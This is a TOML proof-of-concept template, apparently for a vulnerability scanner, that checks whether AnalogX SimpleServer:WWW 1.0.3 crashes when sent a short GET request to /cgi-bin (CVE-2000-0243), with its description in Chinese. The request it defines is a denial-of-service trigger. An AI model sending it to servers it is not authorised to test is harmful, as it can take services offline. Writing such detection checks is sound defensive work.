[info]
author = "AVE"
description = "检查 AnalogX SimpleServer:WWW 1.0.3 是否可通过向 /cgi-bin 发送短 GET 请求导致拒绝服务"
id = "POC-AVE-2000-0221"
name = "AnalogX SimpleServer:WWW 1.0.3 DoS"
severity = "medium"
tags = ["ave-2000-0221"]
vuln_id = [
    "CVE-2000-0243",
    "AVE-2000-0221",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin"
protocol = "http"

[poc.requests.headers]
Connection = "close"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    404,
    500,
]
type = "status"
